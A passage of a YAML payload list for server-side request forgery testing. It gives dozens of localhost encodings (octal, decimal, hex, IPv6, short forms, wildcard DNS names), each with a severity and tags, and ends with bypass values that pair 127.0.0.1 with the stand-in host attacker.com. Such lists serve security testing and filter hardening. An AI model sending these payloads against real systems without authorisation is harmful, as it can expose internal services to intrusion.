      severity: high
      tags: [localhost, ipv4]

    - value: "http://0.0.0.0/"
      description: "0.0.0.0 localhost"
      severity: high
      tags: [localhost, ipv4]

    - value: "http://0.0.0.0:80/"
      description: "0.0.0.0 port 80"
      severity: high
      tags: [localhost, ipv4]

    - value: "http://[::1]/"
      description: "IPv6 localhost"
      severity: high
      tags: [localhost, ipv6]

    - value: "http://[::1]:80/"
      description: "IPv6 localhost port 80"
      severity: high
      tags: [localhost, ipv6]

    - value: "http://[0:0:0:0:0:0:0:1]/"
      description: "Full IPv6 localhost"
      severity: high
      tags: [localhost, ipv6]

    - value: "http://[::ffff:127.0.0.1]/"
      description: "IPv4-mapped IPv6"
      severity: high
      tags: [localhost, ipv6]

    - value: "http://[::ffff:7f00:1]/"
      description: "IPv4-mapped IPv6 hex"
      severity: high
      tags: [localhost, ipv6]

    - value: "http://0177.0.0.1/"
      description: "Octal localhost"
      severity: high
      tags: [localhost, octal]

    - value: "http://0177.0.0.01/"
      description: "Octal localhost variant"
      severity: high
      tags: [localhost, octal]

    - value: "http://2130706433/"
      description: "Decimal localhost"
      severity: high
      tags: [localhost, decimal]

    - value: "http://0x7f000001/"
      description: "Hex localhost"
      severity: high
      tags: [localhost, hex]

    - value: "http://0x7f.0x0.0x0.0x1/"
      description: "Hex dotted localhost"
      severity: high
      tags: [localhost, hex]

    - value: "http://127.1/"
      description: "Short localhost"
      severity: high
      tags: [localhost, short]

    - value: "http://127.0.1/"
      description: "Short localhost 3 octets"
      severity: high
      tags: [localhost, short]

    - value: "http://0/"
      description: "Zero as localhost"
      severity: high
      tags: [localhost, short]

    - value: "http://localhost/"
      description: "Hostname localhost"
      severity: high
      tags: [localhost, hostname]

    - value: "http://localhost:80/"
      description: "Hostname localhost port 80"
      severity: high
      tags: [localhost, hostname]

    - value: "http://0x7f000001"
      description: "Hex without dots"
      severity: high
      tags: [localhost, hex]

    - value: "http://127.0.0.1.nip.io/"
      description: "nip.io DNS wildcard"
      severity: high
      tags: [localhost, dns_wildcard]

    - value: "http://localtest.me/"
      description: "localtest.me DNS"
      severity: high
      tags: [localhost, dns_wildcard]

    - value: "http://spoofed.burpcollaborator.net/"
      description: "Burp collaborator"
      severity: high
      tags: [localhost, dns_wildcard]

    - value: "http://127.0.0.1%00@attacker.com/"
      description: "Null byte bypass"
      severity: high
      tags: [localhost, bypass]

    - value: "http://attacker.com@127.0.0.1/"
